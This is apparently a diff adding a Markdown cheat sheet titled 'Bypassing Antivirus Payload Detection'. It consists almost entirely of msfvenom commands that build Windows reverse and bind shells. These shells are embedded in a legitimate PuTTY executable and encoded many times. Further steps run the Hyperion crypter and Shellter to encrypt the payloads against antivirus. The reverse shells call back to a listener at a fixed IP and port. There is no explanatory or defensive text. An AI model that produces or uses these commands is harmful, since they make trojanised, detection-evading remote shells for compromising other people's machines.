@@ -1,0 +1,34 @@
+# Bypassing Antivirus Payload Detection
+
+
+
+# MSFvenom reverse stageless shells 
+```
+msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp -f exe-only -k -x /root/payloads/putty_x86.exe -o /root/payloads/msfvenom/msfv_reverse_putty_x86.exe - e x86/shikata_ga_nai -i 20 LHOST=192.168.40.128 LPORT=55555 
+msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp -f exe-only -k - x /root/payloads/putty_x64.exe -o /root/payloads/msfvenom/msfv_reverse_putty_x64.exe -e x64/xor -i 20 LHOST=192.168.40.128 LPORT=55555 
+```
+# MSFVenom bind stageless shell 
+```
+msfvenom -a x86 --platform windows -p windows/shell_bind_tcp -f exe-only -k -x /root/payloads/putty_x86.exe -o /root/payloads/msfvenom/msfv_bind_putty_x86.exe -e x86/shikata_ga_nai -i 20 RHOST=0.0.0.0 LPORT=55555 
+msfvenom -a x64 --platform windows -p windows/x64/shell_bind_tcp -f exe-only -k -x /root/payloads/putty_x64.exe -o /root/payloads/msfvenom/msfv_bind_putty_x64.exe -e x64/xor -i 20 RHOST=0.0.0.0 LPORT=55555 
+```
+# Hyperion 2.31 x64 Payload Generating Strings 
+```
+wine hyperion.exe /root/payloads/msfvenom/msfv_reverse_putty_x64.exe /root/payloads/hyperion/hyperion_reverse_putty_x64.exe 
+wine hyperion.exe /root/payloads/msfvenom/msfv_bind_putty_x64.exe /root/payloads/hyperion/hyperion_bind_putty_x64.exe 
+```
+# Hyperion 2.2 x86 Payload Generating Strings 
+```
+wine hyperion.exe /root/payloads/msfvenom/msfv_reverse_putty_x86.exe /root/payloads/hyperion/hyperion_reverse_putty_x86.exe 
+wine hyperion.exe /root/payloads/msfvenom/msfv_bind_putty_x86.exe /root/payloads/hyperion/hyperion_bind_putty_x86.exe 
+```
+# MSFVenom RAW Shellter Payload Generating Strings with only x86 supported 
+```
+msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp -f raw -o /root/payloads/shellter/shellter_reverse_x86.raw -e x86/shikata_ga_nai -i 20 LHOST=192.168.40.128 LPORT=55555 
+msfvenom -a x86 --platform windows -p windows/shell_bind_tcp -f raw -o /root/payloads/shellter/shellter_bind_x86.raw -e x86/shikata_ga_nai -i 20 RHOST=0.0.0.0 LPORT=55555 
+```
+# Hyperion 2.2 x86 encrypt a Shellter payload 
+```
+wine hyperion.exe /root/payloads/shellter/shellter_putty_bind_x86.exe /root/payloads/hyperion/hyperion_shellter_bind_putty_x86.exe 
+wine hyperion.exe /root/payloads/shellter/shellter_putty_reverse_x86.exe /root/payloads/hyperion/hyperion_shellter_reverse_putty_x86.exe 
+```
